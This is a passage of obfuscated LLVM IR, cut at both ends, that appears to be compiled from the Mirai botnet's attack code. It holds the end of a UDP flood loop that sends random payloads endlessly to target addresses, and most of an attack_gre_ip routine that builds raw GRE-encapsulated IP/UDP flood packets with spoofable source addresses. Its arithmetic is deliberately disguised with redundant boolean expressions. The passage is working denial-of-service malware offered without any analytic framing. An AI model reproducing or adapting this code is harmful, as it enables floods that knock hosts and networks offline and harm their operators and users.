
; <label>:57:                                     ; preds = %54, %51
  store i32 0, i32* %9, align 4
  br label %58

; <label>:58:                                     ; preds = %172, %57
  %59 = load i32, i32* %9, align 4
  %60 = load i8, i8* %5, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp slt i32 %59, %61
  br i1 %62, label %63, label %177

; <label>:63:                                     ; preds = %58
  %64 = call noalias i8* @calloc(i64 65535, i64 1) #7
  %65 = load i8**, i8*** %10, align 8
  %66 = load i32, i32* %9, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8*, i8** %65, i64 %67
  store i8* %64, i8** %68, align 8
  %69 = load i16, i16* %12, align 2
  %70 = zext i16 %69 to i32
  %71 = icmp eq i32 %70, 65535
  br i1 %71, label %72, label %81

; <label>:72:                                     ; preds = %63
  %73 = call i32 @rand_next()
  %74 = trunc i32 %73 to i16
  %75 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %76 = load i32, i32* %9, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %75, i64 %77
  %79 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %78, i32 0, i32 0
  %80 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %79, i32 0, i32 1
  store i16 %74, i16* %80, align 2
  br label %90

; <label>:81:                                     ; preds = %63
  %82 = load i16, i16* %12, align 2
  %83 = call zeroext i16 @htons(i16 zeroext %82) #8
  %84 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %85 = load i32, i32* %9, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %84, i64 %86
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %87, i32 0, i32 0
  %89 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %88, i32 0, i32 1
  store i16 %83, i16* %89, align 2
  br label %90

; <label>:90:                                     ; preds = %81, %72
  %91 = call i32 @socket(i32 2, i32 2, i32 17) #7
  %92 = load i32*, i32** %11, align 8
  %93 = load i32, i32* %9, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i32, i32* %92, i64 %94
  store i32 %91, i32* %95, align 4
  %96 = icmp eq i32 %91, -1
  br i1 %96, label %97, label %98

; <label>:97:                                     ; preds = %90
  ret void

; <label>:98:                                     ; preds = %90
  %99 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %99, align 4
  %100 = load i16, i16* %13, align 2
  %101 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %100, i16* %101, align 2
  %102 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %103 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %102, i32 0, i32 0
  store i32 0, i32* %103, align 4
  %104 = load i32*, i32** %11, align 8
  %105 = load i32, i32* %9, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i32, i32* %104, i64 %106
  %108 = load i32, i32* %107, align 4
  %109 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %110 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %110, %struct.sockaddr** %109, align 8
  %111 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %112 = load %struct.sockaddr*, %struct.sockaddr** %111, align 8
  %113 = call i32 @bind(i32 %108, %struct.sockaddr* %112, i32 16) #7
  %114 = icmp eq i32 %113, -1
  br i1 %114, label %115, label %116

; <label>:115:                                    ; preds = %98
  br label %116

; <label>:116:                                    ; preds = %115, %98
  %117 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %118 = load i32, i32* %9, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %117, i64 %119
  %121 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %120, i32 0, i32 2
  %122 = load i8, i8* %121, align 4
  %123 = zext i8 %122 to i32
  %124 = icmp slt i32 %123, 32
  br i1 %124, label %125, label %153

; <label>:125:                                    ; preds = %116
  %126 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %127 = load i32, i32* %9, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %126, i64 %128
  %130 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %129, i32 0, i32 1
  %131 = load i32, i32* %130, align 4
  %132 = call i32 @ntohl(i32 %131) #8
  %133 = call i32 @rand_next()
  %134 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %135 = load i32, i32* %9, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %134, i64 %136
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %137, i32 0, i32 2
  %139 = load i8, i8* %138, align 4
  %140 = zext i8 %139 to i32
  %141 = lshr i32 %133, %140
  %142 = sub i32 0, %141
  %143 = sub i32 %132, %142
  %144 = add i32 %132, %141
  %145 = call i32 @htonl(i32 %143) #8
  %146 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %147 = load i32, i32* %9, align 4
  %148 = sext i32 %147 to i64
  %149 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %146, i64 %148
  %150 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %149, i32 0, i32 0
  %151 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %150, i32 0, i32 2
  %152 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %151, i32 0, i32 0
  store i32 %145, i32* %152, align 4
  br label %153

; <label>:153:                                    ; preds = %125, %116
  %154 = load i32*, i32** %11, align 8
  %155 = load i32, i32* %9, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds i32, i32* %154, i64 %156
  %158 = load i32, i32* %157, align 4
  %159 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %160 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %161 = load i32, i32* %9, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %160, i64 %162
  %164 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %163, i32 0, i32 0
  %165 = bitcast %struct.sockaddr_in* %164 to %struct.sockaddr*
  store %struct.sockaddr* %165, %struct.sockaddr** %159, align 8
  %166 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %167 = load %struct.sockaddr*, %struct.sockaddr** %166, align 8
  %168 = call i32 @connect(i32 %158, %struct.sockaddr* %167, i32 16)
  %169 = icmp eq i32 %168, -1
  br i1 %169, label %170, label %171

; <label>:170:                                    ; preds = %153
  br label %171

; <label>:171:                                    ; preds = %170, %153
  br label %172

; <label>:172:                                    ; preds = %171
  %173 = load i32, i32* %9, align 4
  %174 = sub i32 0, 1
  %175 = sub i32 %173, %174
  %176 = add nsw i32 %173, 1
  store i32 %175, i32* %9, align 4
  br label %58

; <label>:177:                                    ; preds = %58
  br label %178

; <label>:178:                                    ; preds = %211, %177
  store i32 0, i32* %9, align 4
  br label %179

; <label>:179:                                    ; preds = %206, %178
  %180 = load i32, i32* %9, align 4
  %181 = load i8, i8* %5, align 1
  %182 = zext i8 %181 to i32
  %183 = icmp slt i32 %180, %182
  br i1 %183, label %184, label %211

; <label>:184:                                    ; preds = %179
  %185 = load i8**, i8*** %10, align 8
  %186 = load i32, i32* %9, align 4
  %187 = sext i32 %186 to i64
  %188 = getelementptr inbounds i8*, i8** %185, i64 %187
  %189 = load i8*, i8** %188, align 8
  store i8* %189, i8** %22, align 8
  %190 = load i8, i8* %15, align 1
  %191 = icmp ne i8 %190, 0
  br i1 %191, label %192, label %196

; <label>:192:                                    ; preds = %184
  %193 = load i8*, i8** %22, align 8
  %194 = load i16, i16* %14, align 2
  %195 = zext i16 %194 to i32
  call void @rand_str(i8* %193, i32 %195)
  br label %196

; <label>:196:                                    ; preds = %192, %184
  %197 = load i32*, i32** %11, align 8
  %198 = load i32, i32* %9, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds i32, i32* %197, i64 %199
  %201 = load i32, i32* %200, align 4
  %202 = load i8*, i8** %22, align 8
  %203 = load i16, i16* %14, align 2
  %204 = zext i16 %203 to i64
  %205 = call i64 @send(i32 %201, i8* %202, i64 %204, i32 16384)
  br label %206

; <label>:206:                                    ; preds = %196
  %207 = load i32, i32* %9, align 4
  %208 = sub i32 0, 1
  %209 = sub i32 %207, %208
  %210 = add nsw i32 %207, 1
  store i32 %209, i32* %9, align 4
  br label %179

; <label>:211:                                    ; preds = %179
  br label %178
}

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_ip(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i32, align 4
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.grehdr*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.grehdr*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %33 = load i8, i8* %5, align 1
  %34 = zext i8 %33 to i64
  %35 = call noalias i8* @calloc(i64 %34, i64 8) #7
  %36 = bitcast i8* %35 to i8**
  store i8** %36, i8*** %11, align 8
  %37 = load i8, i8* %7, align 1
  %38 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %39 = call i32 @attack_get_opt_int(i8 zeroext %37, %struct.attack_option* %38, i8 zeroext 2, i32 0)
  %40 = trunc i32 %39 to i8
  store i8 %40, i8* %12, align 1
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 3, i32 65535)
  %44 = trunc i32 %43 to i16
  store i16 %44, i16* %13, align 2
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 4, i32 64)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %14, align 1
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 5, i32 1)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %15, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 6, i32 65535)
  %56 = trunc i32 %55 to i16
  store i16 %56, i16* %16, align 2
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 7, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %17, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 0, i32 512)
  store i32 %63, i32* %18, align 4
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 1, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %19, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 19, i32 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = load i32, i32* @LOCAL_ADDR, align 4
  %75 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 25, i32 %74)
  store i32 %75, i32* %21, align 4
  %76 = call i32 @socket(i32 2, i32 3, i32 6) #7
  store i32 %76, i32* %10, align 4
  %77 = icmp eq i32 %76, -1
  br i1 %77, label %78, label %79

; <label>:78:                                     ; preds = %4
  br label %565

; <label>:79:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %80 = load i32, i32* %10, align 4
  %81 = bitcast i32* %9 to i8*
  %82 = call i32 @setsockopt(i32 %80, i32 0, i32 3, i8* %81, i32 4) #7
  %83 = icmp eq i32 %82, -1
  br i1 %83, label %84, label %87

; <label>:84:                                     ; preds = %79
  %85 = load i32, i32* %10, align 4
  %86 = call i32 @close(i32 %85)
  br label %565

; <label>:87:                                     ; preds = %79
  store i32 0, i32* %9, align 4
  br label %88

; <label>:88:                                     ; preds = %328, %87
  %89 = load i32, i32* %9, align 4
  %90 = load i8, i8* %5, align 1
  %91 = zext i8 %90 to i32
  %92 = icmp slt i32 %89, %91
  br i1 %92, label %93, label %335

; <label>:93:                                     ; preds = %88
  %94 = call noalias i8* @calloc(i64 1510, i64 8) #7
  %95 = load i8**, i8*** %11, align 8
  %96 = load i32, i32* %9, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds i8*, i8** %95, i64 %97
  store i8* %94, i8** %98, align 8
  %99 = load i8**, i8*** %11, align 8
  %100 = load i32, i32* %9, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds i8*, i8** %99, i64 %101
  %103 = load i8*, i8** %102, align 8
  %104 = bitcast i8* %103 to %struct.iphdr*
  store %struct.iphdr* %104, %struct.iphdr** %22, align 8
  %105 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %106 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %105, i64 1
  %107 = bitcast %struct.iphdr* %106 to %struct.grehdr*
  store %struct.grehdr* %107, %struct.grehdr** %23, align 8
  %108 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %109 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %108, i64 1
  %110 = bitcast %struct.grehdr* %109 to %struct.iphdr*
  store %struct.iphdr* %110, %struct.iphdr** %24, align 8
  %111 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %112 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %111, i64 1
  %113 = bitcast %struct.iphdr* %112 to %struct.udphdr*
  store %struct.udphdr* %113, %struct.udphdr** %25, align 8
  %114 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %115 = bitcast %struct.iphdr* %114 to i8*
  %116 = load i8, i8* %115, align 4
  %117 = xor i8 %116, -1
  %118 = xor i8 15, -1
  %119 = xor i8 44, -1
  %120 = or i8 %117, %118
  %121 = or i8 44, %119
  %122 = xor i8 %120, -1
  %123 = and i8 %122, %121
  %124 = and i8 %116, 15
  %125 = xor i8 %123, -1
  %126 = xor i8 64, -1
  %127 = xor i8 -37, -1
  %128 = and i8 %125, -37
  %129 = and i8 %123, %127
  %130 = and i8 %126, -37
  %131 = and i8 64, %127
  %132 = or i8 %128, %129
  %133 = or i8 %130, %131
  %134 = xor i8 %132, %133
  %135 = or i8 %125, %126
  %136 = xor i8 %135, -1
  %137 = or i8 -37, %127
  %138 = and i8 %136, %137
  %139 = or i8 %134, %138
  %140 = or i8 %123, 64
  store i8 %139, i8* %115, align 4
  %141 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %142 = bitcast %struct.iphdr* %141 to i8*
  %143 = load i8, i8* %142, align 4
  %144 = xor i8 %143, -1
  %145 = xor i8 -16, -1
  %146 = xor i8 -84, -1
  %147 = or i8 %144, %145
  %148 = or i8 -84, %146
  %149 = xor i8 %147, -1
  %150 = and i8 %149, %148
  %151 = and i8 %143, -16
  %152 = xor i8 %150, -1
  %153 = xor i8 5, -1
  %154 = xor i8 83, -1
  %155 = and i8 %152, 83
  %156 = and i8 %150, %154
  %157 = and i8 %153, 83
  %158 = and i8 5, %154
  %159 = or i8 %155, %156
  %160 = or i8 %157, %158
  %161 = xor i8 %159, %160
  %162 = or i8 %152, %153
  %163 = xor i8 %162, -1
  %164 = or i8 83, %154
  %165 = and i8 %163, %164
  %166 = or i8 %161, %165
  %167 = or i8 %150, 5
  store i8 %166, i8* %142, align 4
  %168 = load i8, i8* %12, align 1
  %169 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %170 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %169, i32 0, i32 1
  store i8 %168, i8* %170, align 1
  %171 = load i32, i32* %18, align 4
  %172 = sext i32 %171 to i64
  %173 = sub i64 0, 52
  %174 = sub i64 0, %172
  %175 = add i64 %173, %174
  %176 = sub i64 0, %175
  %177 = add i64 52, %172
  %178 = trunc i64 %176 to i16
  %179 = call zeroext i16 @htons(i16 zeroext %178) #8
  %180 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %181 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %180, i32 0, i32 2
  store i16 %179, i16* %181, align 2
  %182 = load i16, i16* %13, align 2
  %183 = call zeroext i16 @htons(i16 zeroext %182) #8
  %184 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %185 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %184, i32 0, i32 3
  store i16 %183, i16* %185, align 4
  %186 = load i8, i8* %14, align 1
  %187 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %188 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %187, i32 0, i32 5
  store i8 %186, i8* %188, align 4
  %189 = load i8, i8* %15, align 1
  %190 = icmp ne i8 %189, 0
  br i1 %190, label %191, label %195

; <label>:191:                                    ; preds = %93
  %192 = call zeroext i16 @htons(i16 zeroext 16384) #8
  %193 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %194 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %193, i32 0, i32 4
  store i16 %192, i16* %194, align 2
  br label %195

; <label>:195:                                    ; preds = %191, %93
  %196 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %197 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %196, i32 0, i32 6
  store i8 47, i8* %197, align 1
  %198 = load i32, i32* %21, align 4
  %199 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %200 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %199, i32 0, i32 8
  store i32 %198, i32* %200, align 4
  %201 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %202 = load i32, i32* %9, align 4
  %203 = sext i32 %202 to i64
  %204 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %201, i64 %203
  %205 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %204, i32 0, i32 1
  %206 = load i32, i32* %205, align 4
  %207 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %208 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %207, i32 0, i32 9
  store i32 %206, i32* %208, align 4
  %209 = call zeroext i16 @htons(i16 zeroext 2048) #8
  %210 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %211 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %210, i32 0, i32 1
  store i16 %209, i16* %211, align 2
  %212 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %213 = bitcast %struct.iphdr* %212 to i8*
  %214 = load i8, i8* %213, align 4
  %215 = xor i8 15, -1
  %216 = xor i8 %214, %215
  %217 = and i8 %216, %214
  %218 = and i8 %214, 15
  %219 = and i8 %217, 64
  %220 = xor i8 %217, 64
  %221 = or i8 %219, %220
  %222 = or i8 %217, 64
  store i8 %221, i8* %213, align 4
  %223 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %224 = bitcast %struct.iphdr* %223 to i8*
  %225 = load i8, i8* %224, align 4
  %226 = xor i8 -16, -1
  %227 = xor i8 %225, %226
  %228 = and i8 %227, %225
  %229 = and i8 %225, -16
  %230 = xor i8 %228, -1
  %231 = xor i8 5, -1
  %232 = xor i8 -119, -1
  %233 = and i8 %230, -119
  %234 = and i8 %228, %232
  %235 = and i8 %231, -119
  %236 = and i8 5, %232
  %237 = or i8 %233, %234
  %238 = or i8 %235, %236
  %239 = xor i8 %237, %238
  %240 = or i8 %230, %231
  %241 = xor i8 %240, -1
  %242 = or i8 -119, %232
  %243 = and i8 %241, %242
  %244 = or i8 %239, %243
  %245 = or i8 %228, 5
  store i8 %244, i8* %224, align 4
  %246 = load i8, i8* %12, align 1
  %247 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %248 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %247, i32 0, i32 1
  store i8 %246, i8* %248, align 1
  %249 = load i32, i32* %18, align 4
  %250 = sext i32 %249 to i64
  %251 = sub i64 0, 28
  %252 = sub i64 0, %250
  %253 = add i64 %251, %252
  %254 = sub i64 0, %253
  %255 = add i64 28, %250
  %256 = trunc i64 %254 to i16
  %257 = call zeroext i16 @htons(i16 zeroext %256) #8
  %258 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %259 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %258, i32 0, i32 2
  store i16 %257, i16* %259, align 2
  %260 = load i16, i16* %13, align 2
  %261 = zext i16 %260 to i32
  %262 = xor i32 %261, -1
  %263 = and i32 -1, %262
  %264 = xor i32 -1, -1
  %265 = and i32 %261, %264
  %266 = or i32 %263, %265
  %267 = xor i32 %261, -1
  %268 = trunc i32 %266 to i16
  %269 = call zeroext i16 @htons(i16 zeroext %268) #8
  %270 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %271 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %270, i32 0, i32 3
  store i16 %269, i16* %271, align 4
  %272 = load i8, i8* %14, align 1
  %273 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %274 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %273, i32 0, i32 5
  store i8 %272, i8* %274, align 4
  %275 = load i8, i8* %15, align 1
  %276 = icmp ne i8 %275, 0
  br i1 %276, label %277, label %281

; <label>:277:                                    ; preds = %195
  %278 = call zeroext i16 @htons(i16 zeroext 16384) #8
  %279 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %280 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %279, i32 0, i32 4
  store i16 %278, i16* %280, align 2
  br label %281

; <label>:281:                                    ; preds = %277, %195
  %282 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %283 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %282, i32 0, i32 6
  store i8 17, i8* %283, align 1
  %284 = call i32 @rand_next()
  %285 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %286 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %285, i32 0, i32 8
  store i32 %284, i32* %286, align 4
  %287 = load i8, i8* %20, align 1
  %288 = icmp ne i8 %287, 0
  br i1 %288, label %289, label %295

; <label>:289:                                    ; preds = %281
  %290 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %291 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %290, i32 0, i32 9
  %292 = load i32, i32* %291, align 4
  %293 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %294 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %293, i32 0, i32 9
  store i32 %292, i32* %294, align 4
  br label %310

; <label>:295:                                    ; preds = %281
  %296 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %297 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %296, i32 0, i32 8
  %298 = load i32, i32* %297, align 4
  %299 = sub i32 0, 1024
  %300 = add i32 %298, %299
  %301 = sub i32 %298, 1024
  %302 = xor i32 %300, -1
  %303 = and i32 -1, %302
  %304 = xor i32 -1, -1
  %305 = and i32 %300, %304
  %306 = or i32 %303, %305
  %307 = xor i32 %300, -1
  %308 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %309 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %308, i32 0, i32 9
  store i32 %306, i32* %309, align 4
  br label %310

; <label>:310:                                    ; preds = %295, %289
  %311 = load i16, i16* %16, align 2
  %312 = call zeroext i16 @htons(i16 zeroext %311) #8
  %313 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %314 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %313, i32 0, i32 0
  store i16 %312, i16* %314, align 2
  %315 = load i16, i16* %17, align 2
  %316 = call zeroext i16 @htons(i16 zeroext %315) #8
  %317 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %318 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %317, i32 0, i32 1
  store i16 %316, i16* %318, align 2
  %319 = load i32, i32* %18, align 4
  %320 = sext i32 %319 to i64
  %321 = sub i64 0, %320
  %322 = sub i64 8, %321
  %323 = add i64 8, %320
  %324 = trunc i64 %322 to i16
  %325 = call zeroext i16 @htons(i16 zeroext %324) #8
  %326 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %327 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %326, i32 0, i32 2
  store i16 %325, i16* %327, align 2
  br label %328

; <label>:328:                                    ; preds = %310
  %329 = load i32, i32* %9, align 4
  %330 = sub i32 0, %329
  %331 = sub i32 0, 1
  %332 = add i32 %330, %331
  %333 = sub i32 0, %332
  %334 = add nsw i32 %329, 1
  store i32 %333, i32* %9, align 4
  br label %88

; <label>:335:                                    ; preds = %88
  br label %336

; <label>:336:                                    ; preds = %564, %335
  store i32 0, i32* %9, align 4
  br label %337

; <label>:337:                                    ; preds = %558, %336
  %338 = load i32, i32* %9, align 4
  %339 = load i8, i8* %5, align 1
  %340 = zext i8 %339 to i32
  %341 = icmp slt i32 %338, %340
  br i1 %341, label %342, label %564

; <label>:342:                                    ; preds = %337
  %343 = load i8**, i8*** %11, align 8
  %344 = load i32, i32* %9, align 4
  %345 = sext i32 %344 to i64
  %346 = getelementptr inbounds i8*, i8** %343, i64 %345
  %347 = load i8*, i8** %346, align 8
  store i8* %347, i8** %26, align 8
  %348 = load i8*, i8** %26, align 8
  %349 = bitcast i8* %348 to %struct.iphdr*
  store %struct.iphdr* %349, %struct.iphdr** %27, align 8
  %350 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %351 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %350, i64 1
  %352 = bitcast %struct.iphdr* %351 to %struct.grehdr*
  store %struct.grehdr* %352, %struct.grehdr** %28, align 8
  %353 = load %struct.grehdr*, %struct.grehdr** %28, align 8
  %354 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %353, i64 1
  %355 = bitcast %struct.grehdr* %354 to %struct.iphdr*
  store %struct.iphdr* %355, %struct.iphdr** %29, align 8
  %356 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %357 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %356, i64 1
  %358 = bitcast %struct.iphdr* %357 to %struct.udphdr*
  store %struct.udphdr* %358, %struct.udphdr** %30, align 8
  %359 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %360 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %359, i64 1
  %361 = bitcast %struct.udphdr* %360 to i8*
  store i8* %361, i8** %31, align 8
  %362 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %363 = load i32, i32* %9, align 4
  %364 = sext i32 %363 to i64
  %365 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %362, i64 %364
  %366 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %365, i32 0, i32 2
  %367 = load i8, i8* %366, align 4
  %368 = zext i8 %367 to i32
  %369 = icmp slt i32 %368, 32
  br i1 %369, label %370, label %394

; <label>:370:                                    ; preds = %342
  %371 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %372 = load i32, i32* %9, align 4
  %373 = sext i32 %372 to i64
  %374 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %371, i64 %373
  %375 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %374, i32 0, i32 1
  %376 = load i32, i32* %375, align 4
  %377 = call i32 @ntohl(i32 %376) #8
  %378 = call i32 @rand_next()
  %379 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %380 = load i32, i32* %9, align 4
  %381 = sext i32 %380 to i64
  %382 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %379, i64 %381
  %383 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %382, i32 0, i32 2
  %384 = load i8, i8* %383, align 4
  %385 = zext i8 %384 to i32
  %386 = lshr i32 %378, %385
  %387 = sub i32 %377, 1821419027
  %388 = add i32 %387, %386
  %389 = add i32 %388, 1821419027
